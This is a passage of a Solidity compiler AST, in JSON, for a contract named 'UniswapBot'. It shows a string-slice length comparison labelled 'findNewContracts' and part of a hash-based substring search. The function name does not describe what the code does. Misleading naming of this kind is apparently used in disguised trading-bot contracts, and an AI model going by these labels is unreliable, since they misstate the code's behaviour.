															"referencedDeclaration": 60,
															"src": "1183:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 67,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1190:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "1183:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 69,
													"nodeType": "ExpressionStatement",
													"src": "1183:9:0"
												},
												"nodeType": "ForStatement",
												"src": "1148:1050:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													},
													"id": 170,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 162,
																	"name": "self",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 26,
																	"src": "2219:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																		"typeString": "struct UniswapBot.slice memory"
																	}
																},
																"id": 163,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 21,
																"src": "2219:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 161,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2215:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 160,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2215:3:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 164,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2215:14:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 167,
																	"name": "other",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 28,
																	"src": "2236:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																		"typeString": "struct UniswapBot.slice memory"
																	}
																},
																"id": 168,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 21,
																"src": "2236:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 166,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2232:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 165,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2232:3:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 169,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2232:15:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"src": "2215:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"functionReturnParameters": 32,
												"id": 171,
												"nodeType": "Return",
												"src": "2208:39:0"
											}
										]
									},
									"documentation": null,
									"id": 173,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findNewContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 29,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 26,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 173,
												"src": "883:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 25,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "883:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 28,
												"mutability": "mutable",
												"name": "other",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 173,
												"src": "902:18:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 27,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "902:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "882:39:0"
									},
									"returnParameters": {
										"id": 32,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 31,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 173,
												"src": "945:3:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 30,
													"name": "int",
													"nodeType": "ElementaryTypeName",
													"src": "945:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "944:5:0"
									},
									"scope": 1578,
									"src": "857:1398:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 294,
										"nodeType": "Block",
										"src": "2602:1304:0",
										"statements": [
											{
												"assignments": [
													187
												],
												"declarations": [
													{
														"constant": false,
														"id": 187,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 294,
														"src": "2613:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 186,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2613:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 189,
												"initialValue": {
													"argumentTypes": null,
													"id": 188,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 177,
													"src": "2624:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2613:18:0"
											},
											{
												"assignments": [
													191
												],
												"declarations": [
													{
														"constant": false,
														"id": 191,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 294,
														"src": "2642:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 190,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2642:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 192,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "2642:8:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 195,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 193,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 179,
														"src": "2667:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 194,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 175,
														"src": "2680:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2667:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 289,
												"nodeType": "IfStatement",
												"src": "2663:1201:0",
												"trueBody": {
													"id": 288,
													"nodeType": "Block",
													"src": "2689:1175:0",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 198,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 196,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 179,
																	"src": "2708:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 197,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2721:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2708:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 286,
																"nodeType": "Block",
																"src": "3375:478:0",
																"statements": [
																	{
																		"assignments": [
																			255
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 255,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 286,
																				"src": "3444:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 254,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3444:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 256,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3444:12:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3484:43:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3486:39:0",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "3504:9:0"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "3515:9:0"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "3494:9:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3494:31:0"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "3486:4:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 255,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3486:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 179,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3515:9:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 181,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3504:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 257,
																		"nodeType": "InlineAssembly",
																		"src": "3475:52:0"
																	},
																	{
																		"body": {
																			"id": 284,
																			"nodeType": "Block",
																			"src": "3596:242:0",
																			"statements": [
																				{
																					"assignments": [
																						271
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 271,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 284,
																							"src": "3619:16:0",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 270,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "3619:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 272,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "3619:16:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3667:41:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3669:37:0",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "3691:3:0"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "3696:9:0"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "3681:9:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3681:25:0"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "3669:8:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 179,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3696:9:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 187,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3691:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 271,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3669:8:0",
																							"valueSize": 1
																						}
																					],
																					"id": 273,
																					"nodeType": "InlineAssembly",
																					"src": "3658:50:0"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 276,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 274,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 255,
																							"src": "3734:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 275,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 271,
																							"src": "3742:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "3734:16:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 279,
																					"nodeType": "IfStatement",
																					"src": "3730:57:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 277,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 187,
																							"src": "3784:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 185,
																						"id": 278,
																						"nodeType": "Return",
																						"src": "3777:10:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 282,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 280,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 187,
																							"src": "3810:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 281,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "3817:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "3810:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 283,
																					"nodeType": "ExpressionStatement",
																					"src": "3810:8:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 266,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 262,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 191,
																				"src": "3561:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 265,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 263,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 175,
																					"src": "3568:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 264,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 179,
																					"src": "3578:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3568:19:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3561:26:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 285,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 260,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 258,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 191,
																					"src": "3552:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 259,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3558:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "3552:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 261,
																			"nodeType": "ExpressionStatement",
																			"src": "3552:7:0"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 268,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "3589:5:0",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 267,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 191,
																					"src": "3589:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 269,
																			"nodeType": "ExpressionStatement",
																			"src": "3589:5:0"
																		},
																		"nodeType": "ForStatement",
																		"src": "3547:291:0"
																	}
																]
															},
															"id": 287,
															"nodeType": "IfStatement",
															"src": "2704:1149:0",
															"trueBody": {
																"id": 253,
																"nodeType": "Block",
																"src": "2725:644:0",
																"statements": [
																	{
																		"assignments": [
																			200
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 200,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 253,
																				"src": "2744:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 199,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2744:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 217,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 215,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "2767:34:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 213,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 211,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 203,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "2769:1:0",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 209,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 204,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "2775:1:0",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 207,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 205,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "2780:2:0",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 206,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 179,
																																"src": "2785:9:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "2780:14:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 208,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "2779:16:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "2775:20:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 210,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "2774:22:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "2769:27:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 212,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "2799:1:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "2769:31:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 214,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "2768:33:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 202,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "2759:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 201,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2759:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 216,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2759:43:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2744:58:0"
																	},
																	{
																		"assignments": [
																			219
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 219,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 253,
																				"src": "2823:18:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
